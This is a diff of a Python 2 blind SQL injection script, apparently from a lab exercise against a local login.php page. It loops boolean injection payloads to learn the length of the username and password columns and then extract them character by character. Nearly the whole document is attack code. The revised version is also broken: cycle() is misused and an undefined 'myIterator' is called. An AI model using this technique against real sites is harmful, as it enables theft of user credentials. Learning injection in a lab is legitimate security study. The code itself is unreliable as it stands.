@@ -1,6 +1,7 @@
 import subprocess
 import urllib
 import string
+from itertools import cycle
 
 
 # request = "http://localhost/lab09/login.php?u=\" OR id = 98 AND SUBSTRING(password,1,1) = '1' -- " 
@@ -15,33 +16,32 @@ request = "http://localhost/lab09/login.php?u=\"%20OR%20id%20=%2098%20AND%20SUBS
 
 
 listASCII=string.printable
+iterator=cycle('username','password')
 
-for x in xrange(1,10):
-	pass
-
-size = 0;
-for s in xrange(0,40):
-	request = "http://localhost/lab09/login.php?u=\"%20OR%20id%20=%2098%20AND%20length(username)%20=%20" + str(s) + "--%20"
-	f = urllib.urlopen(request)
-	response = f.read()
-	if (response.find('cat.JPG')!=-1): 
-		print "found size : %s" %s
-		size = s
-		break
-
-for pos in xrange(1,size+1):
-
-	for c in xrange(0,128):
-		request = "http://localhost/lab09/login.php?u=\"%20OR%20id%20=%2098%20AND%20SUBSTRING(username,"+ str(pos) +",1)%20=%20%27" + listASCII[c] + "%27%20--%20" 
+for x in xrange(0,100):
+	field=myIterator.next()
+	size = 0;
+	for s in xrange(0,40):
+		request = "http://localhost/lab09/login.php?u=\"%20OR%20id%20=%2098%20AND%20length(" +field+ ")%20=%20" + str(s) + "--%20"
 		f = urllib.urlopen(request)
 		response = f.read()
 		if (response.find('cat.JPG')!=-1): 
-			print "found letter %s at position %d" %(listASCII[c],pos)
+			print "found size : %s" %s
+			size = s
 			break
 
+	for pos in xrange(1,size+1):
 
-for p in xrange(0,128):
-	print chr(p)			
+		for c in xrange(0,128):
+			request = "http://localhost/lab09/login.php?u=\"%20OR%20id%20=%2098%20AND%20SUBSTRING(" +field+ ","+ str(pos) +",1)%20=%20%27" + listASCII[c] + "%27%20--%20" 
+			f = urllib.urlopen(request)
+			response = f.read()
+			if (response.find('cat.JPG')!=-1): 
+				print "found letter %s at position %d" %(listASCII[c],pos)
+				break
+
+
+		
 
 
 
